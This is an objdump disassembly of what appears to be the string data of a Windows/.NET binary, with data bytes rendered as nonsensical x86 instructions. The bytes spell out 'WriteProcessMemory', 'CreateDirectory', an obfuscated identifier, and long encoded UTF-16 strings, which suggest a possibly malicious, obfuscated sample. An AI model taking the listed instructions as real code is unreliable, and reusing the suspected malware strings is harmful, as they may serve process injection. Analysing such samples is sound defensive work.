10003654:	00 57 72             	add    %dl,0x72(%edi)
10003657:	69 74 65 50 72 6f 63 	imul   $0x65636f72,0x50(%ebp,%eiz,2),%esi
1000365e:	65 
1000365f:	73 73                	jae    0x100036d4
10003661:	4d                   	dec    %ebp
10003662:	65 6d                	gs insl (%dx),%es:(%edi)
10003664:	6f                   	outsl  %ds:(%esi),(%dx)
10003665:	72 79                	jb     0x100036e0
10003667:	00 43 72             	add    %al,0x72(%ebx)
1000366a:	65 61                	gs popa
1000366c:	74 65                	je     0x100036d3
1000366e:	44                   	inc    %esp
1000366f:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
10003676:	79 00                	jns    0x10003678
10003678:	6f                   	outsl  %ds:(%esi),(%dx)
10003679:	70 5f                	jo     0x100036da
1000367b:	45                   	inc    %ebp
1000367c:	71 75                	jno    0x100036f3
1000367e:	61                   	popa
1000367f:	6c                   	insb   (%dx),%es:(%edi)
10003680:	69 74 79 00 55 5a 49 	imul   $0x4a495a55,0x0(%ecx,%edi,2),%esi
10003687:	4a 
10003688:	6c                   	insb   (%dx),%es:(%edi)
10003689:	69 62 62 49 79 4d 65 	imul   $0x654d7949,0x62(%edx),%esp
10003690:	48                   	dec    %eax
10003691:	4f                   	dec    %edi
10003692:	4b                   	dec    %ebx
10003693:	46                   	inc    %esi
10003694:	7a 00                	jp     0x10003696
10003696:	00 00                	add    %al,(%eax)
10003698:	00 81 71 53 00 31    	add    %al,0x31005371(%ecx)
1000369e:	00 70 00             	add    %dh,0x0(%eax)
100036a1:	32 00                	xor    (%eax),%al
100036a3:	4d                   	dec    %ebp
100036a4:	00 6a 00             	add    %ch,0x0(%edx)
100036a7:	42                   	inc    %edx
100036a8:	00 73 00             	add    %dh,0x0(%ebx)
100036ab:	63 00                	arpl   %eax,(%eax)
100036ad:	55                   	push   %ebp
100036ae:	00 56 00             	add    %dl,0x0(%esi)
100036b1:	75 00                	jne    0x100036b3
100036b3:	59                   	pop    %ecx
100036b4:	00 7a 00             	add    %bh,0x0(%edx)
100036b7:	42                   	inc    %edx
100036b8:	00 4d 00             	add    %cl,0x0(%ebp)
100036bb:	4d                   	dec    %ebp
100036bc:	00 30                	add    %dh,(%eax)
100036be:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
100036c2:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
100036c6:	00 49 00             	add    %cl,0x0(%ecx)
100036c9:	77 00                	ja     0x100036cb
100036cb:	62 00                	bound  %eax,(%eax)
100036cd:	48                   	dec    %eax
100036ce:	00 46 00             	add    %al,0x0(%esi)
100036d1:	46                   	inc    %esi
100036d2:	00 62 00             	add    %ah,0x0(%edx)
100036d5:	6d                   	insl   (%dx),%es:(%edi)
100036d6:	00 4e 00             	add    %cl,0x0(%esi)
100036d9:	4c                   	dec    %esp
100036da:	00 57 00             	add    %dl,0x0(%edi)
100036dd:	6e                   	outsb  %ds:(%esi),(%dx)
100036de:	00 59 00             	add    %bl,0x0(%ecx)
100036e1:	79 00                	jns    0x100036e3
100036e3:	4d                   	dec    %ebp
100036e4:	00 47 00             	add    %al,0x0(%edi)
100036e7:	78 00                	js     0x100036e9
100036e9:	78 00                	js     0x100036eb
100036eb:	52                   	push   %edx
100036ec:	00 57 00             	add    %dl,0x0(%edi)
100036ef:	35 00 6a 00 55       	xor    $0x55006a00,%eax
100036f4:	00 58 00             	add    %bl,0x0(%eax)
100036f7:	5a                   	pop    %edx
100036f8:	00 30                	add    %dh,(%eax)
100036fa:	00 53 00             	add    %dl,0x0(%ebx)
100036fd:	31 00                	xor    %eax,(%eax)
100036ff:	70 00                	jo     0x10003701
10003701:	32 00                	xor    (%eax),%al
10003703:	4d                   	dec    %ebp
10003704:	00 6a 00             	add    %ch,0x0(%edx)
10003707:	42                   	inc    %edx
10003708:	00 73 00             	add    %dh,0x0(%ebx)
1000370b:	63 00                	arpl   %eax,(%eax)
1000370d:	55                   	push   %ebp
1000370e:	00 56 00             	add    %dl,0x0(%esi)
10003711:	75 00                	jne    0x10003713
10003713:	59                   	pop    %ecx
10003714:	00 30                	add    %dh,(%eax)
10003716:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
1000371a:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
1000371e:	00 49 00             	add    %cl,0x0(%ecx)
10003721:	77 00                	ja     0x10003723
10003723:	62 00                	bound  %eax,(%eax)
10003725:	48                   	dec    %eax
10003726:	00 46 00             	add    %al,0x0(%esi)
10003729:	46                   	inc    %esi
1000372a:	00 62 00             	add    %ah,0x0(%edx)
1000372d:	6d                   	insl   (%dx),%es:(%edi)
1000372e:	00 4e 00             	add    %cl,0x0(%esi)
10003731:	44                   	inc    %esp
10003732:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
10003736:	00 42 00             	add    %al,0x0(%edx)
10003739:	4c                   	dec    %esp
1000373a:	00 57 00             	add    %dl,0x0(%edi)
1000373d:	6e                   	outsb  %ds:(%esi),(%dx)
1000373e:	00 59 00             	add    %bl,0x0(%ecx)
10003741:	79 00                	jns    0x10003743
10003743:	4d                   	dec    %ebp
10003744:	00 47 00             	add    %al,0x0(%edi)
10003747:	78 00                	js     0x10003749
10003749:	78 00                	js     0x1000374b
1000374b:	52                   	push   %edx
1000374c:	00 57 00             	add    %dl,0x0(%edi)
1000374f:	35 00 6a 00 53       	xor    $0x53006a00,%eax
10003754:	00 31                	add    %dh,(%ecx)
10003756:	00 70 00             	add    %dh,0x0(%eax)
10003759:	32 00                	xor    (%eax),%al
1000375b:	4d                   	dec    %ebp
1000375c:	00 6a 00             	add    %ch,0x0(%edx)
1000375f:	42                   	inc    %edx
10003760:	00 73 00             	add    %dh,0x0(%ebx)
10003763:	63 00                	arpl   %eax,(%eax)
10003765:	55                   	push   %ebp
10003766:	00 56 00             	add    %dl,0x0(%esi)
10003769:	75 00                	jne    0x1000376b
1000376b:	59                   	pop    %ecx
1000376c:	00 31                	add    %dh,(%ecx)
1000376e:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
10003772:	00 55 00             	add    %dl,0x0(%ebp)
10003775:	6b 00 74             	imul   $0x74,(%eax),%eax
10003778:	00 61 00             	add    %ah,0x0(%ecx)
1000377b:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
1000377f:	49                   	dec    %ecx
10003780:	00 77 00             	add    %dh,0x0(%edi)
10003783:	62 00                	bound  %eax,(%eax)
10003785:	48                   	dec    %eax
10003786:	00 46 00             	add    %al,0x0(%esi)
10003789:	46                   	inc    %esi
1000378a:	00 62 00             	add    %ah,0x0(%edx)
1000378d:	6d                   	insl   (%dx),%es:(%edi)
1000378e:	00 4e 00             	add    %cl,0x0(%esi)
10003791:	4c                   	dec    %esp
10003792:	00 57 00             	add    %dl,0x0(%edi)
10003795:	6e                   	outsb  %ds:(%esi),(%dx)
10003796:	00 59 00             	add    %bl,0x0(%ecx)
10003799:	79 00                	jns    0x1000379b
1000379b:	4d                   	dec    %ebp
1000379c:	00 47 00             	add    %al,0x0(%edi)
1000379f:	78 00                	js     0x100037a1
100037a1:	78 00                	js     0x100037a3
100037a3:	52                   	push   %edx
100037a4:	00 57 00             	add    %dl,0x0(%edi)
100037a7:	35 00 6a 00 5a       	xor    $0x5a006a00,%eax
100037ac:	00 31                	add    %dh,(%ecx)
100037ae:	00 45 00             	add    %al,0x0(%ebp)
100037b1:	39 00                	cmp    %eax,(%eax)
100037b3:	53                   	push   %ebx
100037b4:	00 31                	add    %dh,(%ecx)
100037b6:	00 70 00             	add    %dh,0x0(%eax)
100037b9:	32 00                	xor    (%eax),%al
100037bb:	4d                   	dec    %ebp
100037bc:	00 6a 00             	add    %ch,0x0(%edx)
100037bf:	42                   	inc    %edx
100037c0:	00 73 00             	add    %dh,0x0(%ebx)
100037c3:	63 00                	arpl   %eax,(%eax)
100037c5:	55                   	push   %ebp
100037c6:	00 56 00             	add    %dl,0x0(%esi)
100037c9:	75 00                	jne    0x100037cb
100037cb:	59                   	pop    %ecx
100037cc:	00 30                	add    %dh,(%eax)
100037ce:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
100037d2:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
100037d6:	00 49 00             	add    %cl,0x0(%ecx)
100037d9:	77 00                	ja     0x100037db
100037db:	62 00                	bound  %eax,(%eax)
100037dd:	48                   	dec    %eax
100037de:	00 46 00             	add    %al,0x0(%esi)
100037e1:	46                   	inc    %esi
100037e2:	00 62 00             	add    %ah,0x0(%edx)
100037e5:	6d                   	insl   (%dx),%es:(%edi)
100037e6:	00 4d 00             	add    %cl,0x0(%ebp)
100037e9:	39 00                	cmp    %eax,(%eax)
100037eb:	53                   	push   %ebx
100037ec:	00 31                	add    %dh,(%ecx)
100037ee:	00 70 00             	add    %dh,0x0(%eax)
100037f1:	32 00                	xor    (%eax),%al
100037f3:	4d                   	dec    %ebp
100037f4:	00 6a 00             	add    %ch,0x0(%edx)
100037f7:	42                   	inc    %edx
100037f8:	00 73 00             	add    %dh,0x0(%ebx)
100037fb:	63 00                	arpl   %eax,(%eax)
100037fd:	55                   	push   %ebp
100037fe:	00 56 00             	add    %dl,0x0(%esi)
10003801:	75 00                	jne    0x10003803
10003803:	59                   	pop    %ecx
10003804:	00 77 00             	add    %dh,0x0(%edi)
10003807:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
1000380c:	15 4b 00 5a 00       	adc    $0x5a004b,%eax
10003811:	76 00                	jbe    0x10003813
10003813:	32 00                	xor    (%eax),%al
10003815:	30 00                	xor    %al,(%eax)
10003817:	6c                   	insb   (%dx),%es:(%edi)
10003818:	00 71 00             	add    %dh,0x0(%ecx)
1000381b:	45                   	inc    %ebp
1000381c:	00 6e 00             	add    %ch,0x0(%esi)
1000381f:	63 00                	arpl   %eax,(%eax)
10003821:	00 01                	add    %al,(%ecx)
10003823:	00 82 e1 52 00 45    	add    %al,0x450052e1(%edx)
10003829:	00 70 00             	add    %dh,0x0(%eax)
1000382c:	72 00                	jb     0x1000382e
1000382e:	54                   	push   %esp
1000382f:	00 32                	add    %dh,(%edx)
10003831:	00 63 00             	add    %ah,0x0(%ebx)
10003834:	7a 00                	jp     0x10003836
10003836:	4e                   	dec    %esi
10003837:	00 57 00             	add    %dl,0x0(%edi)
1000383a:	4e                   	dec    %esi
1000383b:	00 59 00             	add    %bl,0x0(%ecx)
1000383e:	54                   	push   %esp
1000383f:	00 31                	add    %dh,(%ecx)
10003841:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
10003845:	00 53 00             	add    %dl,0x0(%ebx)
10003848:	6b 00 52             	imul   $0x52,(%eax),%eax
1000384b:	00 4b 00             	add    %cl,0x0(%ebx)
1000384e:	61                   	popa
1000384f:	00 30                	add    %dh,(%eax)
10003851:	00 39                	add    %bh,(%ecx)
10003853:	00 6e 00             	add    %ch,0x0(%esi)
10003856:	4d                   	dec    %ebp
10003857:	00 7a 00             	add    %bh,0x0(%edx)
1000385a:	56                   	push   %esi
1000385b:	00 6a 00             	add    %ch,0x0(%edx)
1000385e:	57                   	push   %edi
1000385f:	00 45 00             	add    %al,0x0(%ebp)
10003862:	39 00                	cmp    %eax,(%eax)
10003864:	45                   	inc    %ebp
10003865:	00 53 00             	add    %dl,0x0(%ebx)
10003868:	6d                   	insl   (%dx),%es:(%edi)
10003869:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
1000386d:	00 5a 00             	add    %bl,0x0(%edx)
10003870:	7a 00                	jp     0x10003872
10003872:	4d                   	dec    %ebp
10003873:	00 31                	add    %dh,(%ecx)
10003875:	00 59 00             	add    %bl,0x0(%ecx)
10003878:	31 00                	xor    %eax,(%eax)
1000387a:	68 00 50 00 61       	push   $0x61005000
1000387f:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10003883:	00 48 00             	add    %cl,0x0(%eax)
10003886:	52                   	push   %edx
10003887:	00 45 00             	add    %al,0x0(%ebp)
1000388a:	70 00                	jo     0x1000388c
1000388c:	72 00                	jb     0x1000388e
1000388e:	54                   	push   %esp
1000388f:	00 32                	add    %dh,(%edx)
10003891:	00 63 00             	add    %ah,0x0(%ebx)
10003894:	7a 00                	jp     0x10003896
10003896:	4e                   	dec    %esi
10003897:	00 57 00             	add    %dl,0x0(%edi)
1000389a:	4e                   	dec    %esi
1000389b:	00 59 00             	add    %bl,0x0(%ecx)
1000389e:	54                   	push   %esp
1000389f:	00 30                	add    %dh,(%eax)
100038a1:	00 52 00             	add    %dl,0x0(%edx)
100038a4:	4b                   	dec    %ebx
100038a5:	00 61 00             	add    %ah,0x0(%ecx)
100038a8:	30 00                	xor    %al,(%eax)
100038aa:	39 00                	cmp    %eax,(%eax)
100038ac:	6e                   	outsb  %ds:(%esi),(%dx)
100038ad:	00 4d 00             	add    %cl,0x0(%ebp)
100038b0:	7a 00                	jp     0x100038b2
100038b2:	56                   	push   %esi
100038b3:	00 6a 00             	add    %ch,0x0(%edx)
100038b6:	57                   	push   %edi
100038b7:	00 45 00             	add    %al,0x0(%ebp)
100038ba:	39 00                	cmp    %eax,(%eax)
100038bc:	57                   	push   %edi
100038bd:	00 62 00             	add    %ah,0x0(%edx)
100038c0:	56                   	push   %esi
100038c1:	00 70 00             	add    %dh,0x0(%eax)
100038c4:	45                   	inc    %ebp
100038c5:	00 53 00             	add    %dl,0x0(%ebx)
100038c8:	6d                   	insl   (%dx),%es:(%edi)
100038c9:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
100038cd:	00 5a 00             	add    %bl,0x0(%edx)
100038d0:	7a 00                	jp     0x100038d2
100038d2:	4d                   	dec    %ebp
100038d3:	00 31                	add    %dh,(%ecx)
100038d5:	00 59 00             	add    %bl,0x0(%ecx)
100038d8:	31 00                	xor    %eax,(%eax)
100038da:	68 00 50 00 52       	push   $0x52005000
100038df:	00 45 00             	add    %al,0x0(%ebp)
100038e2:	70 00                	jo     0x100038e4
100038e4:	72 00                	jb     0x100038e6
100038e6:	54                   	push   %esp
100038e7:	00 32                	add    %dh,(%edx)
100038e9:	00 63 00             	add    %ah,0x0(%ebx)
100038ec:	7a 00                	jp     0x100038ee
100038ee:	4e                   	dec    %esi
100038ef:	00 57 00             	add    %dl,0x0(%edi)
100038f2:	4e                   	dec    %esi
100038f3:	00 59 00             	add    %bl,0x0(%ecx)
100038f6:	54                   	push   %esp
100038f7:	00 7a 00             	add    %bh,0x0(%edx)
100038fa:	4a                   	dec    %edx
100038fb:	00 6f 00             	add    %ch,0x0(%edi)
100038fe:	63 00                	arpl   %eax,(%eax)
10003900:	45                   	inc    %ebp
10003901:	00 52 00             	add    %dl,0x0(%edx)
10003904:	4b                   	dec    %ebx
10003905:	00 61 00             	add    %ah,0x0(%ecx)
10003908:	30 00                	xor    %al,(%eax)
1000390a:	39 00                	cmp    %eax,(%eax)
1000390c:	6e                   	outsb  %ds:(%esi),(%dx)
1000390d:	00 4d 00             	add    %cl,0x0(%ebp)
10003910:	7a 00                	jp     0x10003912
10003912:	56                   	push   %esi
10003913:	00 6a 00             	add    %ch,0x0(%edx)
10003916:	57                   	push   %edi
10003917:	00 45 00             	add    %al,0x0(%ebp)
1000391a:	39 00                	cmp    %eax,(%eax)
1000391c:	45                   	inc    %ebp
1000391d:	00 53 00             	add    %dl,0x0(%ebx)
10003920:	6d                   	insl   (%dx),%es:(%edi)
10003921:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
10003925:	00 5a 00             	add    %bl,0x0(%edx)
10003928:	7a 00                	jp     0x1000392a
1000392a:	4d                   	dec    %ebp
1000392b:	00 31                	add    %dh,(%ecx)
1000392d:	00 59 00             	add    %bl,0x0(%ecx)
10003930:	31 00                	xor    %eax,(%eax)
10003932:	68 00 50 00 59       	push   $0x59005000
10003937:	00 57 00             	add    %dl,0x0(%edi)
1000393a:	31 00                	xor    %eax,(%eax)
1000393c:	30 00                	xor    %al,(%eax)
1000393e:	52                   	push   %edx
1000393f:	00 45 00             	add    %al,0x0(%ebp)
10003942:	70 00                	jo     0x10003944
10003944:	72 00                	jb     0x10003946
10003946:	54                   	push   %esp
10003947:	00 32                	add    %dh,(%edx)
10003949:	00 63 00             	add    %ah,0x0(%ebx)
1000394c:	7a 00                	jp     0x1000394e
1000394e:	4e                   	dec    %esi
1000394f:	00 57 00             	add    %dl,0x0(%edi)
10003952:	4e                   	dec    %esi
10003953:	00 59 00             	add    %bl,0x0(%ecx)
10003956:	54                   	push   %esp
10003957:	00 30                	add    %dh,(%eax)
10003959:	00 52 00             	add    %dl,0x0(%edx)
1000395c:	4b                   	dec    %ebx
1000395d:	00 61 00             	add    %ah,0x0(%ecx)
10003960:	30 00                	xor    %al,(%eax)
10003962:	39 00                	cmp    %eax,(%eax)
10003964:	6e                   	outsb  %ds:(%esi),(%dx)
10003965:	00 4d 00             	add    %cl,0x0(%ebp)
10003968:	7a 00                	jp     0x1000396a
1000396a:	56                   	push   %esi
1000396b:	00 6a 00             	add    %ch,0x0(%edx)
1000396e:	57                   	push   %edi
1000396f:	00 45 00             	add    %al,0x0(%ebp)
10003972:	39 00                	cmp    %eax,(%eax)
10003974:	7a 00                	jp     0x10003976
10003976:	59                   	pop    %ecx
10003977:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
1000397b:	00 45 00             	add    %al,0x0(%ebp)
1000397e:	53                   	push   %ebx
1000397f:	00 6d 00             	add    %ch,0x0(%ebp)
10003982:	74 00                	je     0x10003984
10003984:	50                   	push   %eax
10003985:	00 5a 00             	add    %bl,0x0(%edx)
10003988:	7a 00                	jp     0x1000398a
1000398a:	4d                   	dec    %ebp
1000398b:	00 31                	add    %dh,(%ecx)
1000398d:	00 59 00             	add    %bl,0x0(%ecx)
10003990:	31 00                	xor    %eax,(%eax)
10003992:	68 00 50 00 52       	push   $0x52005000
10003997:	00 45 00             	add    %al,0x0(%ebp)
1000399a:	70 00                	jo     0x1000399c
1000399c:	72 00                	jb     0x1000399e
1000399e:	54                   	push   %esp
1000399f:	00 32                	add    %dh,(%edx)
100039a1:	00 63 00             	add    %ah,0x0(%ebx)
100039a4:	7a 00                	jp     0x100039a6
100039a6:	4e                   	dec    %esi
100039a7:	00 57 00             	add    %dl,0x0(%edi)
100039aa:	4e                   	dec    %esi
100039ab:	00 59 00             	add    %bl,0x0(%ecx)
100039ae:	54                   	push   %esp
100039af:	00 7a 00             	add    %bh,0x0(%edx)
100039b2:	56                   	push   %esi
100039b3:	00 32                	add    %dh,(%edx)
100039b5:	00 59 00             	add    %bl,0x0(%ecx)
100039b8:	30 00                	xor    %al,(%eax)
100039ba:	52                   	push   %edx
100039bb:	00 4b 00             	add    %cl,0x0(%ebx)
100039be:	61                   	popa
100039bf:	00 30                	add    %dh,(%eax)
100039c1:	00 39                	add    %bh,(%ecx)
100039c3:	00 6e 00             	add    %ch,0x0(%esi)
100039c6:	4d                   	dec    %ebp
100039c7:	00 7a 00             	add    %bh,0x0(%edx)
100039ca:	56                   	push   %esi
100039cb:	00 6a 00             	add    %ch,0x0(%edx)
100039ce:	57                   	push   %edi
100039cf:	00 45 00             	add    %al,0x0(%ebp)
100039d2:	39 00                	cmp    %eax,(%eax)
100039d4:	45                   	inc    %ebp
100039d5:	00 53 00             	add    %dl,0x0(%ebx)
100039d8:	6d                   	insl   (%dx),%es:(%edi)
100039d9:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
100039dd:	00 5a 00             	add    %bl,0x0(%edx)
100039e0:	7a 00                	jp     0x100039e2
100039e2:	4d                   	dec    %ebp
100039e3:	00 31                	add    %dh,(%ecx)
100039e5:	00 59 00             	add    %bl,0x0(%ecx)
100039e8:	31 00                	xor    %eax,(%eax)
100039ea:	68 00 50 00 53       	push   $0x53005000
100039ef:	00 45 00             	add    %al,0x0(%ebp)
100039f2:	5a                   	pop    %edx
100039f3:	00 35 00 52 00 45    	add    %dh,0x45005200
100039f9:	00 70 00             	add    %dh,0x0(%eax)
100039fc:	72 00                	jb     0x100039fe
100039fe:	54                   	push   %esp
100039ff:	00 32                	add    %dh,(%edx)
10003a01:	00 63 00             	add    %ah,0x0(%ebx)
10003a04:	7a 00                	jp     0x10003a06
10003a06:	4e                   	dec    %esi
10003a07:	00 57 00             	add    %dl,0x0(%edi)
10003a0a:	4e                   	dec    %esi
10003a0b:	00 59 00             	add    %bl,0x0(%ecx)
10003a0e:	54                   	push   %esp
10003a0f:	00 30                	add    %dh,(%eax)
10003a11:	00 52 00             	add    %dl,0x0(%edx)
10003a14:	4b                   	dec    %ebx
10003a15:	00 61 00             	add    %ah,0x0(%ecx)
10003a18:	30 00                	xor    %al,(%eax)
10003a1a:	39 00                	cmp    %eax,(%eax)
10003a1c:	6e                   	outsb  %ds:(%esi),(%dx)
10003a1d:	00 4d 00             	add    %cl,0x0(%ebp)
10003a20:	7a 00                	jp     0x10003a22
10003a22:	56                   	push   %esi
10003a23:	00 6a 00             	add    %ch,0x0(%edx)
10003a26:	57                   	push   %edi
10003a27:	00 45 00             	add    %al,0x0(%ebp)
10003a2a:	39 00                	cmp    %eax,(%eax)
10003a2c:	6a 00                	push   $0x0
10003a2e:	4d                   	dec    %ebp
10003a2f:	00 31                	add    %dh,(%ecx)
10003a31:	00 4a 00             	add    %cl,0x0(%edx)
10003a34:	45                   	inc    %ebp
10003a35:	00 53 00             	add    %dl,0x0(%ebx)
10003a38:	6d                   	insl   (%dx),%es:(%edi)
10003a39:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
10003a3d:	00 5a 00             	add    %bl,0x0(%edx)
10003a40:	7a 00                	jp     0x10003a42
10003a42:	4d                   	dec    %ebp
10003a43:	00 31                	add    %dh,(%ecx)
10003a45:	00 59 00             	add    %bl,0x0(%ecx)
10003a48:	31 00                	xor    %eax,(%eax)
10003a4a:	68 00 50 00 52       	push   $0x52005000
10003a4f:	00 45 00             	add    %al,0x0(%ebp)
10003a52:	70 00                	jo     0x10003a54
10003a54:	72 00                	jb     0x10003a56
10003a56:	54                   	push   %esp
10003a57:	00 32                	add    %dh,(%edx)
10003a59:	00 63 00             	add    %ah,0x0(%ebx)
10003a5c:	7a 00                	jp     0x10003a5e
10003a5e:	4e                   	dec    %esi
10003a5f:	00 57 00             	add    %dl,0x0(%edi)
10003a62:	4e                   	dec    %esi
10003a63:	00 59 00             	add    %bl,0x0(%ecx)
10003a66:	54                   	push   %esp
10003a67:	00 7a 00             	add    %bh,0x0(%edx)
10003a6a:	46                   	inc    %esi
10003a6b:	00 6b 00             	add    %ch,0x0(%ebx)
10003a6e:	62 00                	bound  %eax,(%eax)
10003a70:	6b 00 52             	imul   $0x52,(%eax),%eax
10003a73:	00 4b 00             	add    %cl,0x0(%ebx)
10003a76:	61                   	popa
10003a77:	00 30                	add    %dh,(%eax)
10003a79:	00 39                	add    %bh,(%ecx)
10003a7b:	00 6e 00             	add    %ch,0x0(%esi)
10003a7e:	4d                   	dec    %ebp
10003a7f:	00 7a 00             	add    %bh,0x0(%edx)
10003a82:	56                   	push   %esi
10003a83:	00 6a 00             	add    %ch,0x0(%edx)
10003a86:	57                   	push   %edi
10003a87:	00 45 00             	add    %al,0x0(%ebp)
10003a8a:	39 00                	cmp    %eax,(%eax)
10003a8c:	45                   	inc    %ebp
10003a8d:	00 53 00             	add    %dl,0x0(%ebx)
10003a90:	6d                   	insl   (%dx),%es:(%edi)
10003a91:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
10003a95:	00 5a 00             	add    %bl,0x0(%edx)
10003a98:	7a 00                	jp     0x10003a9a
10003a9a:	4d                   	dec    %ebp
10003a9b:	00 31                	add    %dh,(%ecx)
10003a9d:	00 59 00             	add    %bl,0x0(%ecx)
10003aa0:	31 00                	xor    %eax,(%eax)
10003aa2:	68 00 50 00 5a       	push   $0x5a005000
10003aa7:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003aab:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003aaf:	00 45 00             	add    %al,0x0(%ebp)
10003ab2:	70 00                	jo     0x10003ab4
10003ab4:	72 00                	jb     0x10003ab6
10003ab6:	54                   	push   %esp
10003ab7:	00 32                	add    %dh,(%edx)
10003ab9:	00 63 00             	add    %ah,0x0(%ebx)
10003abc:	7a 00                	jp     0x10003abe
10003abe:	4e                   	dec    %esi
10003abf:	00 57 00             	add    %dl,0x0(%edi)
10003ac2:	4e                   	dec    %esi
10003ac3:	00 59 00             	add    %bl,0x0(%ecx)
10003ac6:	54                   	push   %esp
10003ac7:	00 30                	add    %dh,(%eax)
10003ac9:	00 52 00             	add    %dl,0x0(%edx)
10003acc:	4b                   	dec    %ebx
10003acd:	00 61 00             	add    %ah,0x0(%ecx)
10003ad0:	30 00                	xor    %al,(%eax)
10003ad2:	39 00                	cmp    %eax,(%eax)
10003ad4:	6e                   	outsb  %ds:(%esi),(%dx)
10003ad5:	00 4d 00             	add    %cl,0x0(%ebp)
10003ad8:	7a 00                	jp     0x10003ada
10003ada:	56                   	push   %esi
10003adb:	00 6a 00             	add    %ch,0x0(%edx)
10003ade:	57                   	push   %edi
10003adf:	00 45 00             	add    %al,0x0(%ebp)
10003ae2:	39 00                	cmp    %eax,(%eax)
10003ae4:	59                   	pop    %ecx
10003ae5:	00 62 00             	add    %ah,0x0(%edx)
10003ae8:	7a 00                	jp     0x10003aea
10003aea:	31 00                	xor    %eax,(%eax)
10003aec:	45                   	inc    %ebp
10003aed:	00 53 00             	add    %dl,0x0(%ebx)
10003af0:	6d                   	insl   (%dx),%es:(%edi)
10003af1:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
10003af5:	00 5a 00             	add    %bl,0x0(%edx)
10003af8:	7a 00                	jp     0x10003afa
10003afa:	4d                   	dec    %ebp
10003afb:	00 31                	add    %dh,(%ecx)
10003afd:	00 59 00             	add    %bl,0x0(%ecx)
10003b00:	31 00                	xor    %eax,(%eax)
10003b02:	68 00 50 00 00       	push   $0x5000
10003b07:	15 44 00 4a 00       	adc    $0x4a0044,%eax
10003b0c:	6b 00 4f             	imul   $0x4f,(%eax),%eax
10003b0f:	00 67 00             	add    %ah,0x0(%edi)
10003b12:	33 00                	xor    (%eax),%eax
10003b14:	35 00 63 00 58       	xor    $0x58006300,%eax
10003b19:	00 4f 00             	add    %cl,0x0(%edi)
10003b1c:	00 81 b1 4d 00 44    	add    %al,0x44004db1(%ecx)
10003b22:	00 52 00             	add    %dl,0x0(%edx)
10003b25:	6b 00 62             	imul   $0x62,(%eax),%eax
10003b28:	00 7a 00             	add    %bh,0x0(%edx)
10003b2b:	46                   	inc    %esi
10003b2c:	00 73 00             	add    %dh,0x0(%ebx)
10003b2f:	61                   	popa
10003b30:	00 31                	add    %dh,(%ecx)
10003b32:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003b36:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
10003b3a:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003b3e:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
10003b42:	00 41 00             	add    %al,0x0(%ecx)
10003b45:	30 00                	xor    %al,(%eax)
10003b47:	5a                   	pop    %edx
10003b48:	00 47 00             	add    %al,0x0(%edi)
10003b4b:	38 00                	cmp    %al,(%eax)
10003b4d:	78 00                	js     0x10003b4f
10003b4f:	62 00                	bound  %eax,(%eax)
10003b51:	47                   	inc    %edi
10003b52:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
10003b56:	00 52 00             	add    %dl,0x0(%edx)
10003b59:	6b 00 34             	imul   $0x34,(%eax),%eax
10003b5c:	00 77 00             	add    %dh,0x0(%edi)
10003b5f:	4e                   	dec    %esi
10003b60:	00 47 00             	add    %al,0x0(%edi)
10003b63:	52                   	push   %edx
10003b64:	00 76 00             	add    %dh,0x0(%esi)
10003b67:	4d                   	dec    %ebp
10003b68:	00 57 00             	add    %dl,0x0(%edi)
10003b6b:	78 00                	js     0x10003b6d
10003b6d:	72 00                	jb     0x10003b6f
10003b6f:	56                   	push   %esi
10003b70:	00 30                	add    %dh,(%eax)
10003b72:	00 5a 00             	add    %bl,0x0(%edx)
10003b75:	4f                   	dec    %edi
10003b76:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
10003b7a:	00 4a 00             	add    %cl,0x0(%edx)
10003b7d:	74 00                	je     0x10003b7f
10003b7f:	4d                   	dec    %ebp
10003b80:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003b84:	00 6b 00             	add    %ch,0x0(%ebx)
10003b87:	62 00                	bound  %eax,(%eax)
10003b89:	7a 00                	jp     0x10003b8b
10003b8b:	46                   	inc    %esi
10003b8c:	00 73 00             	add    %dh,0x0(%ebx)
10003b8f:	61                   	popa
10003b90:	00 31                	add    %dh,(%ecx)
10003b92:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003b96:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
10003b9a:	00 41 00             	add    %al,0x0(%ecx)
10003b9d:	30 00                	xor    %al,(%eax)
10003b9f:	5a                   	pop    %edx
10003ba0:	00 47 00             	add    %al,0x0(%edi)
10003ba3:	38 00                	cmp    %al,(%eax)
10003ba5:	78 00                	js     0x10003ba7
10003ba7:	62 00                	bound  %eax,(%eax)
10003ba9:	47                   	inc    %edi
10003baa:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
10003bae:	00 52 00             	add    %dl,0x0(%edx)
10003bb1:	6b 00 35             	imul   $0x35,(%eax),%eax
10003bb4:	00 57 00             	add    %dl,0x0(%edi)
10003bb7:	4d                   	dec    %ebp
10003bb8:	00 46 00             	add    %al,0x0(%esi)
10003bbb:	67 00 77 00          	add    %dh,0x0(%bx)
